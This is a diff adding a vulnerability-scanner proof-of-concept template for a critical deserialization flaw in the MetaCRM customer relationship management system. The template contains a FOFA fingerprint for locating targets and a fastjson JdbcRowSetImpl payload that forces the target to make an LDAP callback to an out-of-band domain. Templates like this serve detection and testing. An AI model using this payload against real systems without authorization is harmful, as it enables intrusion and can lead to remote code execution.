@@ -1,0 +1,17 @@
+id: poc-yaml-metacrm-sync-emp-weixin-deserialization
+info:
+  name: MetaCRM客户关系管理系统 sync_emp_weixin 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /weixin/admin/sync_emp_weixin.jsp?emp_json=[{%22@type%22:%22[com.sun.rowset.JdbcRowSetImpl%22[{,%22dataSourceName%22:%22ldap://{{.domain}}%22,%22autoCommit%22:true}]
+  expression: reverse.Verify()
+transport: http
